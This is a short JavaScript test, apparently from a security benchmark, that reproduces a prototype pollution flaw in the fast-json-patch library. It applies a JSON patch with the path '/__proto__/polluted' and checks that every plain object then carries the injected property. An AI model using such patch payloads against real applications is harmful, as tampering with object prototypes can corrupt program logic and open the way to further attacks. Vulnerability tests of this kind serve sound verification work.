//https://github.com/Starcounter-Jack/JSON-Patch/issues/216
test("prototype pollution in fast-json-patch", () => {
  let fp = require("fast-json-patch");
  const patch = [{ op: "replace", path: process.env.SECBENCH_PAYLOAD || "/__proto__/polluted", value: "yes" }];

  expect({}.polluted).toBe(undefined);

  fp.applyPatch({}, patch);
  expect({}.polluted).toBe("yes");
});
